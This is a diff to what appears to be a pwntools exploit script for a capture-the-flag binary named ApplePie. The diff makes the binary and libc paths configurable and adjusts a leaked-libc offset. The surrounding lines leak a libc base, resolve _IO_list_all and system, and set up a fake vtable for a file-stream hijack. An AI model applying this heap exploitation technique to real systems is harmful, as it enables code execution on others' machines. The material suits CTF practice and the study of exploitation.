@@ -8,7 +8,10 @@ if __name__ =='__main__':
     uu32    = lambda data   :u32(data.ljust(4,b'\0'))
     uu64    = lambda data   :u64(data.ljust(8,b'\0'))
 
-    p = process("./ApplePie")
+    g_fname = args.FNAME if args.FNAME else "./ApplePie"
+    g_libname = args.LIB if args.LIB else "/lib/x86_64-linux-gnu/libc.so.6"
+
+    p = process(g_fname)
     # p=remote("10.10.2.139",9999)
     context.log_level ='debug'
 
@@ -73,10 +76,10 @@ if __name__ =='__main__':
     #ctx.debug()
     edit_name('A'*0x10)
     ru('to '+'A'*0x10)
-    libc_base = uu64(r(6)) - 0x3c4b78
+    libc_base = uu64(r(6)) - 0x389b78 #0x3c4b78
     log.success("libc_base = %#x", libc_base)
     
-    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
+    libc = ELF(g_libname)
     io_list_all = libc_base+libc.symbols['_IO_list_all']
     system = libc_base+libc.symbols['system']
     fake_vtable = name + 0xe0 - 0x18
